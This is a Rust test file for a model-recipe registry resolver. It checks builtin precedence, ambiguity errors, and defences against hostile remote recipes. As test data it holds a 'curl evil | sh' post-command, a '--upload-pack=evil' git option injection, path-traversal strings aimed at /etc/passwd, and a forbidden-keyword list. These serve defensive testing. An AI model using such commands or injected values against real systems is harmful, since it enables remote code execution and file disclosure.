// SPDX-License-Identifier: AGPL-3.0-only

use super::*;
use crate::io::MemFileSystem;
use std::path::{Path, PathBuf};
use std::sync::Arc;

const RECIPE: &str = "model: org/m\ncontainer: img:tag\nruntime: atlas\n";

fn remote(name: &str, fs: Arc<MemFileSystem>) -> RemoteRegistry {
    let reg: RemoteRegistry = serde_yaml_ng::from_str(&format!(
        "name: {name}\nurl: https://example.invalid/{name}.git\npath: /cache/{name}\n"
    ))
    .expect("registry parses");
    reg.with_fs(fs)
}

#[test]
fn references_parse_into_the_right_shape() {
    assert_eq!(
        RecipeRef::parse("@atlas/qwen3.6-27b-fp8"),
        RecipeRef::Scoped {
            registry: "atlas".into(),
            name: "qwen3.6-27b-fp8".into()
        }
    );
    assert_eq!(
        RecipeRef::parse("qwen3.6-27b-fp8"),
        RecipeRef::Bare("qwen3.6-27b-fp8".into())
    );
    assert_eq!(
        RecipeRef::parse("./r.yaml"),
        RecipeRef::Path("./r.yaml".into())
    );
    assert_eq!(
        RecipeRef::parse("dir/r.yaml"),
        RecipeRef::Path("dir/r.yaml".into())
    );
}

#[test]
fn a_bare_name_resolves_from_the_builtin_corpus() {
    let set = RegistrySet::builtin_only();
    let r = set
        .resolve(&RecipeRef::parse("qwen3.6-27b-fp8"))
        .expect("resolves");
    assert_eq!(r.name, "qwen3.6-27b-fp8");
    assert!(matches!(r.provenance, Provenance::Builtin { .. }));
}

#[test]
fn an_unknown_name_suggests_close_matches() {
    let err = RegistrySet::builtin_only()
        .resolve(&RecipeRef::parse("qwen3.6-27b-typo"))
        .expect_err("must fail");
    let msg = err.to_string();
    assert!(
        msg.contains("qwen3.6-27b"),
        "should suggest neighbours: {msg}"
    );
}

#[test]
fn the_builtin_registry_is_reachable_by_its_qualified_name() {
    let set = RegistrySet::builtin_only();
    assert!(
        set.resolve(&RecipeRef::parse("@atlas/qwen3.6-27b-fp8"))
            .is_ok()
    );
}

#[test]
fn a_remote_cannot_shadow_a_builtin_recipe() {
    // The name-squatting defence: a remote may carry a colliding name, but a
    // bare reference must never silently resolve to it.
    let fs = Arc::new(MemFileSystem::new());
    fs.insert(
        "/cache/third/recipes/qwen3.6-27b-fp8.yaml",
        "model: evil/m\ncontainer: e\nruntime: atlas\n",
    );
    let set = RegistrySet::with_remotes(vec![remote("third", fs)]);

    let r = set
        .resolve(&RecipeRef::parse("qwen3.6-27b-fp8"))
        .expect("resolves");
    assert!(
        matches!(r.provenance, Provenance::Builtin { .. }),
        "builtin must win"
    );
    assert_ne!(r.model, "evil/m");

    // It remains reachable when asked for explicitly.
    let scoped = set
        .resolve(&RecipeRef::parse("@third/qwen3.6-27b-fp8"))
        .expect("resolves");
    assert_eq!(scoped.model, "evil/m");
}

#[test]
fn a_name_in_two_remotes_is_ambiguous_rather_than_arbitrary() {
    let fs = Arc::new(MemFileSystem::new());
    fs.insert("/cache/a/recipes/shared.yaml", RECIPE);
    fs.insert("/cache/b/recipes/shared.yaml", RECIPE);
    let set = RegistrySet::with_remotes(vec![remote("a", fs.clone()), remote("b", fs)]);
    let err = set
        .resolve(&RecipeRef::parse("shared"))
        .expect_err("must be ambiguous");
    assert!(err.to_string().contains("ambiguous"), "{err}");
}

#[test]
fn a_remote_recipe_carrying_executable_content_still_cannot_launch() {
    let fs = Arc::new(MemFileSystem::new());
    fs.insert(
        "/cache/third/recipes/hostile.yaml",
        "model: org/m\ncontainer: i\nruntime: atlas\npost_commands:\n  - curl evil | sh\n",
    );
    let set = RegistrySet::with_remotes(vec![remote("third", fs)]);
    let r = set
        .resolve(&RecipeRef::parse("@third/hostile"))
        .expect("loads so it can be explained");
    assert!(
        !r.is_launchable(),
        "a remote must not be able to smuggle in a command"
    );
    assert!(r.refused_keys.contains(&"post_commands".to_string()));
}

#[test]
fn reserved_names_cannot_be_taken_by_a_remote() {
    let fs = Arc::new(MemFileSystem::new());
    for name in RESERVED {
        let mut store = RemoteStore::default();
        let err = store
            .add(remote(name, fs.clone()))
            .expect_err("must be refused");
        assert!(err.to_string().contains("reserved"), "{err}");
    }
}

#[test]
fn a_duplicate_registry_name_is_refused() {
    let fs = Arc::new(MemFileSystem::new());
    let mut store = RemoteStore::default();
    store.add(remote("third", fs.clone())).expect("first add");
    assert!(
        store.add(remote("third", fs)).is_err(),
        "second add must be refused"
    );
}

#[test]
fn the_persisted_store_has_no_trust_field_at_all() {
    // Regression guard on the whole point of this design: there must be nothing
    // in the serialized form that could grant a registry the right to run code.
    let fs = Arc::new(MemFileSystem::new());
    let mut store = RemoteStore::default();
    store.add(remote("third", fs.clone())).unwrap();
    let yaml = serde_yaml_ng::to_string(&store).unwrap();
    for forbidden in ["trust", "trusted", "hook", "post_command", "exec"] {
        assert!(
            !yaml.contains(forbidden),
            "`{forbidden}` appears in the store: {yaml}"
        );
    }
}

#[test]
fn clone_argv_guards_against_a_url_that_looks_like_an_option() {
    let argv = git_clone_argv("--upload-pack=evil", Path::new("/cache/x"));
    let dashdash = argv
        .iter()
        .position(|a| a == "--")
        .expect("`--` guard present");
    let url = argv
        .iter()
        .position(|a| a == "--upload-pack=evil")
        .expect("url present");
    assert!(
        dashdash < url,
        "the url must come after `--` so git cannot parse it as an option"
    );
}

#[test]
fn updating_is_confined_to_the_cache_directory() {
    let cache = PathBuf::from("/home/u/.cache/atlasctl/registries");
    assert!(RemoteStore::guard_cache_path(&cache, &cache.join("third")).is_ok());
    // `git reset --hard` in a directory the user chose would destroy their work.
    let err = RemoteStore::guard_cache_path(&cache, Path::new("/home/u/my-project"))
        .expect_err("must refuse");
    assert!(
        err.to_string().contains("outside the registry cache"),
        "{err}"
    );
}

#[test]
fn listing_reports_provenance_for_every_entry() {
    let fs = Arc::new(MemFileSystem::new());
    fs.insert("/cache/third/recipes/extra.yaml", RECIPE);
    let set = RegistrySet::with_remotes(vec![remote("third", fs)]);
    let list = set.list();
    assert!(list.iter().any(|e| e.registry == BUILTIN));
    assert!(
        list.iter()
            .any(|e| e.name == "extra" && e.registry == "third")
    );
}

/// `RecipeRef::parse` takes everything after `@registry/` verbatim, and one
/// caller — a `RankAssignment` from whichever node is acting as head — is an
/// unvalidated string. The name is then joined onto the cache directory, so it
/// decides which file is read.
#[test]
fn a_scoped_name_cannot_walk_out_of_the_cache() {
    use crate::registry::remote::is_safe_recipe_name;
    for hostile in [
        "../../../etc/hosts",
        "..",
        "a/../../b",
        "/etc/passwd",
        "",
        "a//b",
    ] {
        assert!(
            !is_safe_recipe_name(hostile),
            "{hostile:?} must not be joined onto the recipe directory"
        );
    }
}

/// And the shape a real remote recipe has must still resolve — the guard is
/// per-segment precisely so `family/leaf` keeps working.
#[test]
fn a_real_remote_recipe_name_is_still_accepted() {
    use crate::registry::remote::is_safe_recipe_name;
    for ok in [
        "qwen3.6/qwen3.6-27b-nvfp4-unsloth",
        "gemma4/gemma-4-26b-a4b",
        "solo",
    ] {
        assert!(
            is_safe_recipe_name(ok),
            "{ok:?} is a legitimate remote name"
        );
    }
}
